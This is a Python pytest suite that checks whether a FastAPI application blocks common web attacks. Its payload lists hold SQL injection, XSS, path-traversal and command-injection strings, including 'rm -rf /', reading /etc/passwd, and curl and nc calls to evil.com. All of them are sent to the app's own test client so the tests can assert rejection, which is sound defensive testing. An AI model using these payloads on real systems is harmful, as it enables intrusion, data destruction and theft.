"""Comprehensive security testing suite."""

import pytest
import json
from fastapi.testclient import TestClient
from src.api.main import app


class TestSecurityValidation:
    """Security testing suite."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        return TestClient(app)

    def test_sql_injection_protection(self, client):
        """Test protection against SQL injection attacks."""
        sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' UNION SELECT * FROM users --",
            "'; UPDATE users SET password='hacked' WHERE username='admin'; --"
        ]

        for payload in sql_injection_payloads:
            response = client.post("/analysis/start", json={
                "document_name": payload,
                "rubric": "test"
            })

            # Should be blocked by input validation
            assert response.status_code == 400
            assert "Invalid request data" in response.json()["error"]

    def test_xss_protection(self, client):
        """Test protection against XSS attacks."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "<iframe src=javascript:alert('xss')></iframe>",
            "onmouseover=alert('xss')",
            "<body onload=alert('xss')>"
        ]

        for payload in xss_payloads:
            response = client.post("/analysis/start", json={
                "document_name": payload,
                "rubric": "test"
            })

            # Should be blocked by input validation
            assert response.status_code == 400
            assert "Invalid request data" in response.json()["error"]

    def test_no_sql_injection_protection(self, client):
        """Test protection against NoSQL injection attacks."""
        nosql_payloads = [
            '{"$where": "this.username == this.password"}',
            '{"username": {"$ne": null}, "password": {"$ne": null}}',
            '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}',
            '{"$or": [{"username": "admin"}, {"password": "admin"}]}'
        ]

        for payload in nosql_payloads:
            try:
                data = json.loads(payload)
                response = client.post("/auth/login", json=data)

                # Should be handled gracefully (may return validation error)
                assert response.status_code in [400, 401, 422]
            except json.JSONDecodeError:
                # Invalid JSON should be rejected
                pass

    def test_command_injection_protection(self, client):
        """Test protection against command injection attacks."""
        command_injection_payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& whoami",
            "; ls -la",
            "`id`",
            "$(whoami)",
            "; curl http://evil.com/steal",
            "| nc evil.com 1234"
        ]

        for payload in command_injection_payloads:
            response = client.post("/analysis/start", json={
                "document_name": payload,
                "rubric": "test"
            })

            # Should be blocked by input validation
            assert response.status_code == 400
            assert "Invalid request data" in response.json()["error"]

    def test_path_traversal_protection(self, client):
        """Test protection against path traversal attacks."""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ]

        for payload in path_traversal_payloads:
            response = client.post("/analysis/start", json={
                "document_name": payload,
                "rubric": "test"
            })

            # Should be blocked by input validation
            assert response.status_code == 400
            assert "Invalid request data" in response.json()["error"]

    def test_security_headers_presence(self, client):
        """Test that security headers are present."""
        response = client.get("/health/")

        security_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "X-XSS-Protection": "1; mode=block",
            "Referrer-Policy": "strict-origin-when-cross-origin",
            "Permissions-Policy": "geolocation=(), microphone=(), camera=()"
        }

        for header, expected_value in security_headers.items():
            assert header in response.headers
            assert response.headers[header] == expected_value

    def test_cors_security(self, client):
        """Test CORS security configuration."""
        # Test with disallowed origin
        response = client.get("/", headers={
            "Origin": "https://malicious-site.com"
        })

        # Should not have CORS headers for disallowed origin
        assert "Access-Control-Allow-Origin" not in response.headers

        # Test with allowed origin
        response = client.get("/", headers={
            "Origin": "http://127.0.0.1:3000"
        })

        # Should have CORS headers for allowed origin
        assert "Access-Control-Allow-Origin" in response.headers
        assert response.headers["Access-Control-Allow-Origin"] == "http://127.0.0.1:3000"

    def test_rate_limiting_security(self, client):
        """Test rate limiting provides security."""
        # Make many requests quickly
        responses = []
        for _ in range(20):
            response = client.post("/auth/login", json={
                "username": "test",
                "password": "test"
            })
            responses.append(response)

        # Some requests should be rate limited
        rate_limited = any(r.status_code == 429 for r in responses)
        # Note: Rate limiting may not be active for all endpoints in tests

    def test_input_size_limits(self, client):
        """Test input size limits prevent DoS attacks."""
        # Test very large JSON payload
        large_data = {"data": "x" * 1000000}  # 1MB of data

        response = client.post("/analysis/start", json=large_data)

        # Should be rejected due to size limit
        assert response.status_code in [400, 413]

    def test_content_type_security(self, client):
        """Test content type validation."""
        # Test with invalid content type
        response = client.post("/analysis/start",
                             data="malicious data",
                             headers={"Content-Type": "application/x-executable"})

        # Should be rejected
        assert response.status_code in [400, 415]

    def test_http_method_security(self, client):
        """Test HTTP method security."""
        # Test unsupported methods
        response = client.request("TRACE", "/health/")
        assert response.status_code == 405  # Method Not Allowed

        response = client.request("CONNECT", "/health/")
        assert response.status_code == 405  # Method Not Allowed

    def test_error_information_disclosure(self, client):
        """Test that errors don't disclose sensitive information."""
        # Test with invalid data
        response = client.post("/analysis/start", json={"invalid": "data"})

        assert response.status_code in [400, 422]
        error_data = response.json()

        # Should not contain sensitive system information
        error_message = str(error_data).lower()
        sensitive_terms = [
            "sqlalchemy",
            "database",
            "connection",
            "password",
            "secret",
            "key",
            "token",
            "internal",
            "stack trace",
            "exception"
        ]

        # In production mode, should not expose internal details
        for term in sensitive_terms:
            assert term not in error_message or "debug" in error_data

    def test_authentication_bypass_attempts(self, client):
        """Test protection against authentication bypass attempts."""
        bypass_attempts = [
            {"Authorization": "Bearer invalid-token"},
            {"Authorization": "Basic invalid-credentials"},
            {"X-API-Key": "invalid-key"},
            {"Cookie": "session=invalid-session"},
            {}  # No authentication
        ]

        for headers in bypass_attempts:
            response = client.get("/users/", headers=headers)

            # Should require proper authentication
            assert response.status_code in [401, 403]

    def test_session_security(self, client):
        """Test session security."""
        # Test session fixation protection
        response1 = client.post("/auth/login", json={
            "username": "test",
            "password": "test"
        })

        # Should not expose session information in headers
        session_headers = ["Set-Cookie", "Session-ID", "JSESSIONID"]
        for header in session_headers:
            assert header not in response1.headers

    def test_csrf_protection(self, client):
        """Test CSRF protection."""
        # Test state-changing operations without proper CSRF protection
        response = client.post("/users/", json={
            "username": "test",
            "password": "test"
        })

        # Should require proper CSRF protection
        assert response.status_code in [400, 403, 422]

    def test_information_leakage_prevention(self, client):
        """Test prevention of information leakage."""
        # Test endpoints that might leak information
        sensitive_endpoints = [
            "/admin/",
            "/debug/",
            "/config/",
            "/logs/",
            "/.env",
            "/.git/config"
        ]

        for endpoint in sensitive_endpoints:
            response = client.get(endpoint)

            # Should not expose sensitive information
            assert response.status_code in [404, 403, 401]

    def test_timing_attack_protection(self, client):
        """Test protection against timing attacks."""
        import time

        # Test authentication timing consistency
        valid_attempts = []
        invalid_attempts = []

        # Valid authentication attempts
        for _ in range(5):
            start = time.time()
            response = client.post("/auth/login", json={
                "username": "valid_user",
                "password": "valid_password"
            })
            valid_attempts.append(time.time() - start)

        # Invalid authentication attempts
        for _ in range(5):
            start = time.time()
            response = client.post("/auth/login", json={
                "username": "invalid_user",
                "password": "invalid_password"
            })
            invalid_attempts.append(time.time() - start)

        # Timing should be consistent (within reasonable variance)
        valid_avg = sum(valid_attempts) / len(valid_attempts)
        invalid_avg = sum(invalid_attempts) / len(invalid_attempts)

        # Should not have significant timing difference
        timing_diff = abs(valid_avg - invalid_avg)
        assert timing_diff < 0.1  # Less than 100ms difference
